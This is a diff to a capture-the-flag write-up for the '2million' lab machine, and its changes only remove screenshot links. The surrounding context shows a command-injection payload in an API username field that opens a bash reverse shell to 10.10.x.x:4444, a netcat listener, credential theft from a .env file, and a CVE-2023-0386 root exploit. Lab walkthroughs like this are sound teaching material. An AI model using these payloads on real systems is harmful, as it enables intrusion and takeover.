@@ -36,8 +36,6 @@ PORT   STATE SERVICE VERSION
 
 Add `2million.htb` to `/etc/hosts`.
 
-![Nmap scan of the target](../images/twomillion-01-nmap.png)
-
 ### The invite-code flow
 
 `/invite` loads `/js/inviteapi.min.js`. Beautifying it reveals a `makeInviteCode()` function
@@ -55,8 +53,6 @@ curl -s -X POST http://2million.htb/api/v1/invite/generate | jq
 # {"data":{"code":"<base64>", "format":"encoded"}}
 echo '<base64>' | base64 -d
 ```
-
-![Deobfuscated inviteapi.min.js and decoding the invite code](../images/twomillion-02-invite-code.png)
 
 Use the decoded code to register at `/invite`, then log in.
 
@@ -100,8 +96,6 @@ curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate \
   -d '{"username":"test; bash -c \"bash -i >& /dev/tcp/10.10.x.x/4444 0>&1\" #"}'
 ```
 
-![Command injection in /api/v1/admin/vpn/generate yielding a www-data shell](../images/twomillion-03-vpn-cmdi.png)
-
 Catch the reverse shell with `nc -lvnp 4444` → shell as **www-data**.
 
 ### Credentials from .env → SSH as admin
@@ -144,8 +138,6 @@ make all
 # terminal 2:
 ./exp
 ```
-
-![CVE-2023-0386 OverlayFS exploit granting a root shell](../images/twomillion-04-cve-2023-0386-root.png)
 
 ```
 root@2million:~# id
